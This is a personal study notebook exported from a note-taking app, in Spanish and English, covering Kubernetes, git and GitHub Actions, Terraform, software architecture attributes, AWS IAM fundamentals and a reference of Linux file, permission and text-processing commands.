- recurso que permite acceder a los servicios de k8s, de manera externa
- estos vienen de terceros
- se debe activar en minikube
- balancea el trafico desde los endpoints
- se puede implementar encriptacion https
- estos van a un servicio de k8s
- existen algunos genericos que se pueden usar dentro de la propia infra
- para minikube:
   → minikube addons enabled ingress
   → kubectl get pods -n kube-system, debe de tener un nginx
   → kubectl get all -n ingress-nginx
- se tienen IngressClass





---------------------------KUBE 0 TO 100--------------------------------------
correr apps contenerizadas
instancias como ganado
es declarativo
trata de arreglar los errores por si mismos
control plane - servidores de k8s
nodos - corre el kubelet y k-proxy (recibe el trafico y lo manda a los pods que les corresponde el trafico)
scheduler
etcd, base de datos basada en key-value
cloud-controller-manager, este se conecta al cloud
- kubectl version --client=true
- kubectl get nodes
- kubectl get ns, trae los namespaces
- kubectl exec -it {pod} -- sh
- existen variables que se pueden heredar desde los k8s
- redinessProbe, esta listo para recibir trafico
- livenessProbe, el pod esta vivo
- lo ideal es crear deployments que son los que cubren a los pods
- daemonset permite ejecutar un pod en cada nodo
- statefulset, estos crean pods con volumenes persistentes, se usa storageClassName: do-block-storage, para crear un disco en el provedor de aws
- kubectl describe pod {name pod}
- kubectl get pvc (para volumenes persistentes)
- kubectl get statefulsets|sts
NETWORKING
se tiene el ETCD
CNI sirve para crear una vpn entre los nodos (pods), el agente se llama calico
los servicios en K8s son formas de poder contactar apps, se manejan por kube-proxy
- cluster-ip, ip fija dentro del cluster que no cambia, sirve como load balancer entre todos los pods
- node port, crea un puerto en cada nodo para enviar el trafico a los servicios
- load balancer, este esta configurado para la nube, sirve par redireccionar tambien el trafico
cluster ip es el default
ingress sirve para pasar servicios de acuerdo al path que se les pase
nginx-ingress
buscar stern</rich_text>
    </node>
    <node name="github action" unique_id="124" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1668619411" ts_lastsave="1670266096">
      <rich_text>Service of automatization by github
Use of CI/CD (Continuos Delivery)

git add {files}
git commit
git checkout {id}, to change by another previous commit
git revert {id}, this create a new commit with the previous changes
git reset --hard {id}, delete all commits since {id}
git log
git branch
git branch {name}
git checkout {branch}
git branch -D {branch}, to delete
git checkout -b {branch}, to create and change to branch
git merge {branch}
git remote add {url}
git push origin {branch}
git pull origin {branch}
git clone {url-repo} {name folder}
git remote get-url {origin}

GITHUB ACTION
Key Elements:
- workflow: this includes jobs, this is added to code repository, this is the first thing in github actions, triggered by events
- job: this contains one or more steps, defined a runner, is possible run un parallel or sequential, can be conditional
- step: this is actions to execute, execute a shell script, custom or third-party actions, this is executed in order, can be conditionals
- is posible create multiple workflows

EVENTS
- filter is based on target branch, is possible to use in some actions
- is possible avoid some actions using in the commit message: [skip ci]


</rich_text>
    </node>
    <node name="Terraform" unique_id="125" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670266110" ts_lastsave="1672422494">
      <rich_text>terraform import {resource name} {id resource created}

$ terraform plan                                  # plan
$ terraform apply                                 # shortcut for plan &amp; apply - avoid this in production
$ terraform plan -out out.terraform      # terraform plan and write the plan to out file
$ terraform apply out.terraform            # apply terraform plan using out file
$ terraform show                                  # show current state
$ cat terraform.tfstate                           # show state in JSON format


Infrastructure as code
version control Infra
para las variables se usa .tfvars, se acostumbra no subir este archivo a git con credenciales
lookup para buscar la variable a usar en un map
con provisioner “file”, se puede subir un archivo a una instancia de aws
para sobreescribir ssh se puede usar connection en instace aws

terraform state
este guarda los datos en terraform.tfstate
hace un backup de estaado previo
con cada apply, este crea un nuevo state y hacec el backup
con este es como se mantiene un track de los cambios realizados
se puede mantener en un controlador de versionamientos
se pueden usar varios backend para guardalos como;
	s3
	consul
	terraform enterprise
se usa vantante para trabajar con colaboradores

para cambiar el backend del terraform:
	- se crea el archivo backend.tf donde se configura el bucket name y la llave con la que se guarda
	- con terraform init es suficiente para que funcione
	
data sources se usa para poder obtener valores, por ejemplo los rangos de ips dependiendo de la zona

terraform fmt, sirve para dar formato y estilo a los archivos
get, dedscarga y actualiza los modulos
graph crea una grafico de la infra
remote, configura los estados remotos
taint sirve para marcar una instancia la cual se va a recrear la proxima vez


Certification
- write code to create resources
- code wil be stored in git
- audit log
- ability yo have a review process
- can be used to disaster recovery
- is agnostic of regions or organizations, reusability
- possible automation
- terraform use HLC Hashicopr Configuration Language
- can execute a plan to describe infraestructure to create or modify
- terraform resolve dependencies between resources
- workflow is plan -&gt; apply
- terraform will only update resources that need to be changed
- terraform uses providers
- terraform core contains the language unterpreter
- it doesn't contain the code to interact with the API of the cloud providers to create resources, the code is in providers, terraform init
- exists different types of proviosining VMS
   → local-provisioner, execute in local, cannot be fully controlled by terraform
   → remote-provisioner, execute something remote on the VM, cannot be fully controlled by terraform
   → Packer, build AMI
   → Cloud Init, using user_data
   → provisioners add a considerable amount of complexity and uncertainty
- for multiple cases is used cloud init
- cli
   → terraform fmt, this is like golangfmt
   → terraform taint, is to mark an instance to destroy, this before use terraform apply
   → terraform import, import resources created
   → terraform workspace, new, list, show, select and delete workspaces, terraform.workspace to use with the code
   → terraform state, manipulate the terraform state file ***move, remove, list, pull, push replace-provider
- inputs and outputs:
   → inputs are paremeters to use with resources
   → outputs is used by another modules
- terraform workflow:
   → init
   → validate
   → write
   → plan
   → apply (create)
- datasources allow data to be fetched or computed from outside of terraform</rich_text>
    </node>
    <node name="Arquitectura de software" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619532733" ts_lastsave="1671058511">
      <rich_text>Que es?
Estructuras, modelos con daigramas, comunicacion entre diferentes modulos del sistema
Entender el rol del arquitecto

# Etapas del proceso
- Analisis de requerimientos, nace de una idea o problema, aqui se entiende que se va a construir, requerimientos de negocio, usuario, funcionales y no funcionales
- Diseño de la solucion, Analisis profundo de los problemas, ya se tiene una propuesta de esas soluciones, aqui empieza el arquitecto
- Desarrollo y evaluacion, programacion y pruebas, criterios de aceptacion, set necesario para construirla
- Despliegue, infraestructura y roles de operacion para que este disponible
- Mantenimiento y evolucion, Arreglo de errores y agregado de nuevas funcionalidades

# Dificultades en el desarrollo
- Esenciales, Entender el diseño y concepto
   → complejidad, que tan dificil se vuelve, por ejemplo el calculo de rutas
   → conformidad, el contexto que se va a usar y como adaptarlo, por ejemplo la efectividad del software
   → tolerancia al cambio, se puede cambiar o ya no, que tanto cambia el problema que se resolvio
   → invisibilidad, se vuelve dificil al no ser tangible
- Accidentales, tecnologia y plaforma que se usara, conexiones entre tecnologias o resoluciones en esa tecnologia
   → Lenguajes de alto nivel, elmismo lenguahe se vuelve una dificultad
   → multiprocesamiento, el poder hacer mas de una tarea en la computadora
   → Entornos de programación, algo asi como el que nos ayude con las propiedades que tengan clases o funciones del lenguaje
como se resuelve?? No desarrollar, comprar OSS, Prototipado rapido, Desarrollo evolutivo, Grandes diseñadores (arquitectos)

# Roles
- Experto del dominio, es elq ue sabia que se requeria del dominio, en las nuevas metodologias son las partes interesadas
- Analista, es el que indaga en que se debe de resolver, este es el cliente/dueño del producto, en las nuevas metodologias
- Admininistrador de sistemas, los viejos sysadmin, hoy DevOps/SRE
- Equipo de desarrollo, los qa, desarrollador, arquitecto
- gestor del proyeco, se encarga de las entregas y que se cumpla con el plan, facilitador

# Que es la arquitectura de software
- modelos y diagramas con conexiones entre cajas
- este es muy sesgado, pero se deben de hacer analisis profundos sobre que es lo que hay que contruir, y como es que el sistema los va a resolver
- la arquitectura es algo estructural, por medio de objetos ocultando propiedades, es un conjunto de decisiones para el diseño del sistema
- la arquitectura se reduce a cuaqluier cosa importante

# La importancia de la comunicación (ley de conway)
- la comunicación es fundamental para la arquitectura del software
- la comunicación dara estructura

# Objetivos del arquitecto
- tiene varias partes interesadas:
   → cliente, quiere un sistema en presupuesto y a tiempo
   → desarrollador, facil de implementar y mantener
   → manager, desarrollar software de forma independiente, asi como lo mismo que el usuario
   → qa, facil de probar
   → usuario, debe de ser disponible y confiable

# Arquitectura y metodologías
- nace en metodologias tradicionales, para encontrar problemas y solucionar a gran escala, las agiles emerge de un equipo autogestionado
- En la tradicional se toman la definicion, restricciones, requerimientos, riesgos, le falta feedback, este se viene hasta que se termina la solución
- en metodologia agil, se puede planear en el planteamiento del sprint, se debe de poder medir, se pueden hacer esqueletos de solución
- lo mas importante para ser agiles es el feedback

# Entender el problema
- Separar la comprension del problema de la propuesta
- Espacio del problema, idea, criterios de exito, historias de usuario
- Espacio de la solucion, diseño, desarrollo, evaluacion, criterios de aceptacion, despliegue
- se narran historias para llegar a eso
- es la limitante del problema

# Requerimientos
- despues de entender el problema
- de producto, que es lo que necesita
   → negocio, consta de reglas de negocio
   → usuario, como el usuario usa el sistema, atributos de calidad, garantia de que tenga calidad y es enfatizado
   → funcionales, se alimentan de todo, para saber que se debe de hacer especificamente, tambien tienen requerimientos de sistemas, son afectados por las restricciones
- de proyecto, no tiene que ver con la arquitectura
   → recursos
   → capacitacion
   → certificaciones
   → documentacion de usuario
   → infraestructura
   → licencias
   → plan de despliegue
   → plan de transicion
   → acuerdos de servicio
- funcionales, como se va a comportar el sistema
- no funciones, tiene que ver mas con calidad, son parte de los funcionales, siempre los vinculaban con la arquitectura
- requerimientos significativos, afectan el diseño la arquitectura

# Riesgos
- para describir, usar escenarios de fracaso que sean medibles y accionables
- de ingenieria, se mitiga a traves de diseño e implementacion
- de gestion de proyecto, relacinados mas con la planeacion
- se identifican con la toma de requerimientos (difcultad y complejidad), atributos de calidad (insertidumbre) y conocimiento del dominio (riesgo prototipico)
- Se priorizan riesgos y se solucionan los mas criticos, no se pueden solucionar todos

# Restricciones
- limita las opciones de diseño o implementacion
- las partes interesadas, integraciones con otros sistemas, ciclo de vida del producto

# Arquitectura, panorama y definición
- se debe de saber que pasa en el software
- verificacion de sacrificios y beneficios
- un estilo de arquitectura es algo generico, resolución a nivel de conectores
- es una coleccion de decisiones de diseño

# Llamada y retorno
- hacen invocaciones a otros componentes y espera una respuesta
- programa principal y subrutinas, estilo C
- OOP, para aplicaciones que se van a mantener mucho tiempo
- Multinivel, se tienen diferentes niveles que se van a comunicar por nivel

# Flujo de datos
- Lote secuencial, lo importante es ejecutar una pieza de codigo y cuando termine pase a otra etapa
- Tubos y filtros, es un streaming

# Centrada en datos
- Pizarron, se tienen diferentes componentes que interractuan con un componente principal, cada componente recibe y procesa los datos y envia al pizarron, también el pizarron puede tener procesamiento y dar una salida
- Centrada en base de datos, generalmente es usado con una base de datos y los componentes comparten esa base de datos, los componentes no se comunican entre si, la base es el puente
- Sistema experto, estilo basado en reglas, un cliente se comunica con otro que infiere las reglas o consultas, este se comunica con un tercero que es una base de datos de conocimiento

# Componentes independientes
- Invocación implicita, basada en eventos, aplicaciones que se mandan mensajes entre si, sin que sepan quien invoca a aquien, se usa un bus para comunicarse
- Invocación explicita, aqui se sabe que se invoca, pero no son dependientes uno del otro, su comunicación es directa, hay un registro central que le dice quien puede rexolver un problema

# Como se elije?
- Monoliticos, eficiencia, curva de aprendizaje, capacidad de prueba, capacidad de modificacion
- Distribuidos, mocularidad, disopnibilidad, uso de recursos, adaptabilidad

--- parte profesional
# Atributos
- son cualidades de que tan bueno o malo es un sistema en si mismo, expectativas del usuario, de que tan bien funciona un sistema
   → idoneidad funcional, conecta a lo que el usuario queire hacer y como esta implementadas en el sistema
      ⇒ completitud funcional, cuan completa esta la implementacion
      ⇒ exactitud funciona, cuan preciso es el sistema
      ⇒ pertinencia funcional, cuan alineado esta lo que se implemento con lo que se requeria
   → Eficiencia de ejecucion, que tan bueno y eficiente el sistema a la hora de responder al usuario, a la vez que tan bueno es con los recursos
      ⇒ tiempo a comportamiento, cuan bueno es el sistema respondiendo al usuario
      ⇒ uso de recursos, cuanto aprovecha el sistema los recursos de tipo hardware
      ⇒ capacidad, cuantos soporta el sistema en cantidad de peticiones, carga, lectura y escritura
   → compatibilidad, cuanto puede el sistema vivir en un contexto mas grande, que tanto otros sistemas puede convivir con el
      ⇒ interoperabilidad, cuan facil es comunicarse con el sistema, y con otros
      ⇒ coexistencia, cuanto el sistema soporta estar con otros sistemas, medible a travez del numero de fallos por razones externas
   → Usabilidad
      ⇒ reconocimiento de idoneidad, cuando nos damos cuenta que el sistema nos ayuda a resolver nuestro objetivo, el dominio del problema esta asociado al sistema
      ⇒ curva de aprendizaje, cuan facil o dificil es aprender a usar un sistema
      ⇒ operabilidad, cual es la cantidad de pasos para lograr un objetivo
      ⇒ proteccion a errores, cuanto feedback se le da al usuario (400)
      ⇒ estatica de interfaz, es algo abstracto, este se mide con encuestas
      ⇒ accesibilidad, capacidad de ser usado por personas con discapacidades
   → Confiabilidad, cuanto el sistema nos permite a travez del tiempo usarlo de forma normal
      ⇒ Madurez, cuanto falla el sistema en su uso normal, tiempo medio entre averias
      ⇒ disponibilidad, cantidad de tiempo fuera del servicio
      ⇒ tolerancia a fallos, como el sistema puede seguir dando servicios si es que tuvo un fallo
      ⇒ capacidad de recuperacion, cuanto tiempo tarda en regresar a estar disponible despues del fallo
   → seguridad, cuanto el sistema protege la informacion del usuario, la identificacion y a que puede y no acceder
      ⇒ confidencialidad, autorizacion del sistema para que un usuario pueda ver o no algo de la informacion del sistema 
      ⇒ traza de responsabilidad, comprobacion de hechos, como se conecta cada accion del sistema, ya sea de parte del usuario o del sistema
      ⇒ integridad, cuanto el sistema toma recaudos para proteger la informacion de atacantes
      ⇒ comprobacion de hechos, garantizar que algo realmente paso
      ⇒ autenticidad, como se logra identifcar al usuario
   → Mantenibilidad, eso que hace que un sistema pueda evolucionar con nuevas funcionalidad y que sea reparable
      ⇒ modularidad, capacidad de un sistema se poder ser separado en partes
      ⇒ reusabilidad, cuanto se puede usar un modulo o pieza de software pra usar en otro lado
      ⇒ capacidad ded analisis, es sobre cuanto se puede entender el problema y conectarlo al sistema en codigo
      ⇒ capacidad de modificacion, cuan facil o dificil es ir al codigo y cambiar el codigo
      ⇒ capacidad de prueba, cuan facil o dificil es crear los test para garantizar que el sistema hace lo que debe de hacer
   → portabilidad
      ⇒ adaptabilidad, de cuanto depende nuestro sistema de un entorno especifico
      ⇒ capacidad de instalacion, cuan fuertemente se tienen requerimientos del entorno del despliegue, que tan complejo se hace el despliegue
      ⇒ capacidad de reemplazo, cuales son los requerimientos que hoy se cumple y como el sistema puede ser reemplazado efectivamente, retrocompatibilidad
- tensiones entre atributos</rich_text>
    </node>
    <node name="Arquitectura backend" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1641243251" ts_lastsave="1670282858">
      <rich_text>- Que es backend
   → es el sofware que se ejecuta en el servidor
- sistemas distribuidos
   → </rich_text>
    </node>
    <node name="DevOps Basico" unique_id="126" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670889552" ts_lastsave="1670891571">
      <rich_text>aws ec2 describe-instances \
--filters </rich_text>
      <rich_text foreground="#dd1144">"Name=instance-state-code,Values=80"</rich_text>
      <rich_text>  \
--query </rich_text>
      <rich_text foreground="#dd1144">'Reservations[].Instances[].[Tags[?Key==`Name`] | [0].Value, InstanceId, PublicIpAddress,  State.Name, StateTransitionReason]'</rich_text>
      <rich_text>  \
--output table</rich_text>
    </node>
    <node name="AWS - Speciality" unique_id="127" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1671579555" ts_lastsave="1671582045">
      <node name="Certification" unique_id="128" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1671579581" ts_lastsave="1672341107">
        <rich_text>AWS accounts
- exists account root user, has full control over account
- IAM is used to create users, groups, roles and policies
- access by conole, api or CLI

What is cloud computing
- server is composed of CPU and RAM, Storage
- database store data in a structure way
- Networks: routers, switch, DNS server
- tradicionally the infrastructure begins in garage before move to office and before in data center (servers that scale)
- me pays for this servers and services
- is necesary a team that monitor infra 24/7
- is the on deman delivery of computer power, database storage, application and other IT resources
- use only of necessary for my apps
- is possible ger resources as is necesary
- this is used with servers, storages, databases or set of apps services
- exists:
   → private, in the same enterprise
   → public, cloud resources owner and operated by thid
      ⇒ Six advantages of cloud computing
   → hybrid, use servers on premise and extend capabilities to the cloud
- Five characteristics
   → on demand self services
      ⇒ Users can provision resources
   → Broad network access
      ⇒ is possible accessed by diverse client platforms
   → Multi tenancy and resources pooling
      ⇒ multiple customer can share the same infra
      ⇒ multiple customer are serviced from the same phisical resources
   → rapid elasticity and scability
      ⇒ automatically and qquickly acquire and sipose resources
      ⇒ scaled on demand
   → measured services
      ⇒ use pay by use
- Six advantges of cloud computing
   → Trade capital expense (CAPX) for operational expense (OPEX)
   → Benefit from massive economies of scale
   → Stop guessing capacity
   → Increase speed and agility
   → Stop spending money running and maintaining data centers
   → go global in minutes: leverage the aws global infra
- problems solved:
   → flexibility
   → cost effectiveness
   → scability
   → elasticity
   → high availibility and fault tolerance
   → agility
- types of cloud computing
   → IaaS
      ⇒ networking, computers, data storage
      ⇒ highest level of flexibility
      ⇒ EC2
   → PaaS
      ⇒ removes manage the underlying infra
      ⇒ focus on the deployment and management of your apps
      ⇒ Elastic Beanstalk
   → SaaS
      ⇒ product managed by service provider
      ⇒ rekognition for ML</rich_text>
      </node>
      <node name="Security" unique_id="129" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1671582045" ts_lastsave="1672341080">
        <rich_text>AWS Fundamentals
- IAM is used to autehnticated to send requests
- for person or applications, make a request for an action or operation
- Identity - based policy, uses a roles
- Resource - based policy, apply of resources (ex s3 buckets)
- Roles are used for delegation and are assumed
- Roles are assumed by users, applications and services (sts:AssumeRole)
- Methods of authentication:
   → Username, password, MFA token(optional)
   → CLI, API = Access key and secret key
   → Signing Certificate -&gt; ec2
   → SSh key -&gt; AWS CodeCommit
   → Keyspaces credencial -&gt; Amazon Keyspaces

IAM Access Control:
- Identity based policies
   → are jsons permissions policy that contrik what actions an identity can perform 
- resource - based policies
   → are jsons policy that you attach a resource
- Methods
   → RBAC (role based access control)
      ⇒ good practice is to grant the minimum permissions required to perform the job
      ⇒ job function policies:
         • Administrator
         • Billing
         • Database administrator
         • Data scientist
         • Developer power user
         • Network administrator
         • Security auditor
         • Support user
         • System administrator
         • View-only user
   → ABAC (attribute based access control)
      ⇒ is generally using tags
- Permissions Boundaries
   → sets the maximun permission that the entity can have
   → Privilege Escalation (it very importante use Permission boundary to avoid create innecesaries resources), permissions boundary is used to limit creation of IAM user with elevated permission
- deny &gt; allow

AWS Organization
- is a service to manage multiple acounts
- cross account
- used with organization with multiple schemas
- is necesary a management account, AWS management to create organization

IAM Roles
- very uses with across accounts
- is necesary use a eternal ID in conditions to assume role

</rich_text>
      </node>
    </node>
    <node name="Telemetry (Prom &amp; Graf)" unique_id="130" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672430910" ts_lastsave="1672431148">
      <rich_text>collection of business and diagnosis data from the software in prod, and store and visualize it for eht purpose of diagnostic</rich_text>
    </node>
    <node name="Linux" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672680784" ts_lastsave="1688748748">
      <rich_text>Linux
- Operating system, is in middle of your hardware and users
- linux born in 1991
- mostly free and open source

Things to remember:
- Linux has super user (root)
- is Case sensitive
- avoid using spaces when creating files and directories
- linux kernel is not an operating system
- Linux is mostly CLI not GUI
- is very flexible

Filesystem
- system used by an operating system to manage files, the system controls how data is saved or retrieved
- /lib is where C programming libraries files
- commands:
   → cd, change directory
   → pwd, print directory
   → ls, listing files
- properties of files, ls -l:
   → Type, if d is directory, l is a link, - is a file
   → # of links, hard links to file
   → owner
   → group
   → size
   → month
   → day
   → time
   → name
- file types:
   → - regular file
   → d directory
   → l link
   → c special file or device file
   → s socket
   → p Named pipe
   → b block device
- exists 3 types of root
   → root account, the most powerful account in linux
   → / the very first directory in linux as root directory
   → root home directory, is the home of root /root
- to change password is used: password {id user}
- create files and directories:
   → touch, create a new file
   → cp, copy file
   → vi, is an editor
   → mkdir, to create directory
   → ls -ltr, show files by date of creation (most recent)
   → cp -R {source} {destination}, to copy folders
- find files and directories
   → find -- find . -name “{filename}”
   → locate, locate {filename}, if locate does not found is necesary run as root: “updatedb”, it is a db cached of files, is much faster find
- wildcards
   → *, zero or more chars
   → ?, a single char
   → ^, begin of line
   → $, end of line
   → \, for special char
   → [], range of chars
   → {}, touch abcd{1..9}-xzy
- soft and hard links
   → inode = pointer or number of a file on the hdd
   → is not possible create in the same directory
   → hard links only works in the same partition 
   → softlink, this removed if file is removed or rename, </rich_text>
      <rich_text weight="heavy">ln</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">-s</rich_text>
      <rich_text> {origin}
   → hardlink, if original file is remove, renaming o moving this continues, </rich_text>
      <rich_text weight="heavy">ln {origin} </rich_text>
      <rich_text>
   → ls -li (show inode id)

Linux Fundamentals
- UNIX is a multi-user system
- permissions may be restricted to by types
   → r, read
   → w, write
   → x, execute
- this is controlled by:
   → u, user
   → g, group
   → o, other in the system
- to change permissions is used </rich_text>
      <rich_text weight="heavy">chmod</rich_text>
      <rich_text> 
- ownership command
   → exists two owners of a file or directory
      ⇒ user and group
   → chown, change ownership of a File
   → chgrp changes the group ownership
   → -R is used to change option in cascade
- ACL
   → additional layer to permissions us more flexible
   → external user that is not in a group but is necessary the permission on files
   → is more flexible permissions
   → commands
      ⇒ setfacl, setfacl -m u:user:rwx {path}, group: setfacl -m g:group:rwx {path}
         • all files in inherit: setfacl -dm “entry” {path}
         • specific entry: setfacl -x u:user {path}
         • all entries: setfacl -b {path}
      ⇒ getfacl
- whatis {command}
- adding text, 3 ways:
   → using editor like vi
   → redirect command output &gt; or &gt;&gt;
   → echo &gt; or &gt;&gt;
   → &gt;, creates and add data
   → &gt;&gt;, add data in the next line
- redirects, exists 3
   → stdin, file descriptor is 0
   → stdout, file descriptor is 1
   → stderr, file descriptor is 2
   → input, use &lt;, when feeding file contests toa file
   → err:
      ⇒ this is produced if command send error
      ⇒ ex: ls -l /root 2&gt; errorfile
- tee, is used to store and view (in the same time) the output, save in file and in stdout, this delete the previous text in the file, using -a appends new text
- pipes is used to connect output of one command to input of another
- File maintance commands
   → cp, copy files
   → rm, delete files
   → mv, move or rename files
   → mkdir, creates new directory
   → rmdir or rm -r, remove directory
   → chgrp, change group of file
   → chown, change owner of file
- file display commands
   → cat, view all file
   → more, one page in time, in percent, and only down
   → less, one page in time, down and up
   → head, first n lines
   → tail, last n lines
- Text processors
   → cut
      ⇒ cut parts of lines from specified files or piped data and print the result
      ⇒ </rich_text>
      <rich_text weight="heavy">cut</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">-c1 {filename}</rich_text>
      <rich_text>, cut the first charater
      ⇒ </rich_text>
      <rich_text weight="heavy">cut -c1,2,3,5 {filename}</rich_text>
      <rich_text>, cuts the char 1,2,3,5, with </rich_text>
      <rich_text weight="heavy">c1-3</rich_text>
      <rich_text> cuts the 1 to 3 chars, is possible the combination for </rich_text>
      <rich_text weight="heavy">c-1-3,5-10</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">cut -d: -f 6 /etc/passwd</rich_text>
      <rich_text>, limits by “:”, the -6 select the number of column
   → awk
      ⇒ language designed for data extraction
      ⇒ </rich_text>
      <rich_text weight="heavy">awk ‘{print $1}’ {file}</rich_text>
      <rich_text>, print first column (space separator)
      ⇒ </rich_text>
      <rich_text weight="heavy">ls -l | awk ‘{print $NF}’</rich_text>
      <rich_text>, print the last column
      ⇒ </rich_text>
      <rich_text weight="heavy">awk ‘/{var}/ {print}’ {file}</rich_text>
      <rich_text>, search var in file
      ⇒ </rich_text>
      <rich_text weight="heavy">awk -F: ‘{print $1}’ /etc/passwd</rich_text>
      <rich_text>, print the first column separated by “:”
      ⇒ </rich_text>
      <rich_text weight="heavy">echo “Hello tom” | awk ‘{$2="Adam"; print $0}’</rich_text>
      <rich_text>, replace Tom by Adam
      ⇒ </rich_text>
      <rich_text weight="heavy">awk ‘length($0) &gt; 15’ {file}</rich_text>
      <rich_text>, get all lines with len &gt; 15
      ⇒ </rich_text>
      <rich_text weight="heavy">ls -l | awk ‘{if($9 == “{str}”) print $0;}’</rich_text>
      <rich_text>, this is for search the match with the string
      ⇒ </rich_text>
      <rich_text weight="heavy">ls -l | awk ‘{print NF}’</rich_text>
      <rich_text>, prints number of fields
   → grep/egrep
      ⇒ global regular expression print, process text by text and print any lines which match a specified pattern
      ⇒ </rich_text>
      <rich_text weight="heavy">grep keyword file</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">grep -c keywork file</rich_text>
      <rich_text>, count occurencies
      ⇒ </rich_text>
      <rich_text weight="heavy">grep -i keyword file</rich_text>
      <rich_text>, search witout import lower o upper
      ⇒ </rich_text>
      <rich_text weight="heavy">grep -n keyword file</rich_text>
      <rich_text>, show line where is the occurencies
      ⇒ </rich_text>
      <rich_text weight="heavy">grep -v keyword file</rich_text>
      <rich_text>, avoid lines qith keyword
      ⇒ </rich_text>
      <rich_text weight="heavy">egrep -i “{regex}” file</rich_text>
      <rich_text>, is possible use | to serach two words
   → sort
      ⇒ sorts in alphabetical order
      ⇒ </rich_text>
      <rich_text weight="heavy">sort file</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">sort -r file</rich_text>
      <rich_text>, reverse
      ⇒ </rich_text>
      <rich_text weight="heavy">sort -k{number} file</rich_text>
      <rich_text>, sort by column number
   → uniq
      ⇒ filter out duplicate lines
      ⇒ </rich_text>
      <rich_text weight="heavy">uniq file</rich_text>
      <rich_text>
   → wc
      ⇒ this is for word count, new lines, word of byte
      ⇒ </rich_text>
      <rich_text weight="heavy">wc file</rich_text>
      <rich_text>, show #lines #chars # bytes
      ⇒ </rich_text>
      <rich_text weight="heavy">wc -l</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">file</rich_text>
      <rich_text>, only counts lines
      ⇒ </rich_text>
      <rich_text weight="heavy">wc -w</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">file</rich_text>
      <rich_text>, counts the words
      ⇒ </rich_text>
      <rich_text weight="heavy">wc -c file</rich_text>
      <rich_text>, counts bytes
      ⇒ </rich_text>
      <rich_text weight="heavy">ls -l | wc -l</rich_text>
      <rich_text>, number of files
      ⇒ </rich_text>
      <rich_text weight="heavy">grep keyword | wc -l</rich_text>
      <rich_text>, number of keywords
   → diff
      ⇒ this compare line by line
   → cmp
      ⇒ compare byte to byte
   → tar
      ⇒ puts in one container or one fie
      ⇒ </rich_text>
      <rich_text weight="heavy">tar cvf {file_output}.tar {directory}</rich_text>
      <rich_text>, compress and save in one file
      ⇒ </rich_text>
      <rich_text weight="heavy">tar xvf {file}.tar</rich_text>
      <rich_text>, to decompress
   → gzip
      ⇒ compress files
      ⇒ </rich_text>
      <rich_text weight="heavy">gzip {file}.tar</rich_text>
      <rich_text>, to compress
   → gunzip
      ⇒ compress files, identical to gzip -d
   → truncate
      ⇒ used tt shrink or extend the size of a file
      ⇒ </rich_text>
      <rich_text weight="heavy">truncate -s 10 filename</rich_text>
      <rich_text>, this eliminate data
   → cat
      ⇒ used to combine multiple files
      ⇒ </rich_text>
      <rich_text weight="heavy">cat {files} &gt; file_out</rich_text>
      <rich_text>
   → split
      ⇒ </rich_text>
      <rich_text weight="heavy">split -l 300 file.txt childfile</rich_text>
      <rich_text>, split file into 300 lines perfile and output in childfile
   → seed
      ⇒ replace a string in file text
      ⇒ find and delete a line
      ⇒ remove empty lines
      ⇒ remove the first or n lines
      ⇒ replace tabs with spaces
      ⇒ show defined lines from a files
      ⇒ substitute within vi editor
      ⇒ </rich_text>
      <rich_text weight="heavy">sed ‘s/string/replace/g’ {filename}</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">sed ‘s/string/replace/g’ {filename}</rich_text>
      <rich_text>, this replace and change in the file
      ⇒ </rich_text>
      <rich_text weight="heavy">sed ‘s/string//g’ {filename}</rich_text>
      <rich_text>, delete string
      ⇒ </rich_text>
      <rich_text weight="heavy">sed ‘s/string/d’ {filename}</rich_text>
      <rich_text>, delete lines with string
      ⇒ </rich_text>
      <rich_text weight="heavy">sed -i ‘/^$/d’ {filename}</rich_text>
      <rich_text>, this delete empty lines
      ⇒ </rich_text>
      <rich_text weight="heavy">sed ‘1,2d’ {filename}</rich_text>
      <rich_text>, delete 1 and 2 lines
      ⇒ </rich_text>
      <rich_text weight="heavy">sed ‘s/\t/ /g’ {filename}</rich_text>
      <rich_text>, replace tabs with spaces
      ⇒ </rich_text>
      <rich_text weight="heavy">sed -n 12,18p {filename}</rich_text>
      <rich_text>, show lines 12-18, if is used d, this delete
      ⇒ </rich_text>
      <rich_text weight="heavy">sed G {filename}</rich_text>
      <rich_text>, this add one space between lines
   → useradd
      ⇒ useradd -g {group} -s {shell} -c “user description” -m -d {home} {name}
   → groupadd
      ⇒ groupadd {name}
   → userdel
      ⇒ userdel -r {username}
   → groupdel
      ⇒ groupdel {name}
   → usermod
      ⇒ usermod -G {group} {username}
   → files:
      ⇒ /etc/passwd
      ⇒ /etc/group
      ⇒ /etc/shadow
   → chage
      ⇒ is the /etc/login.def file
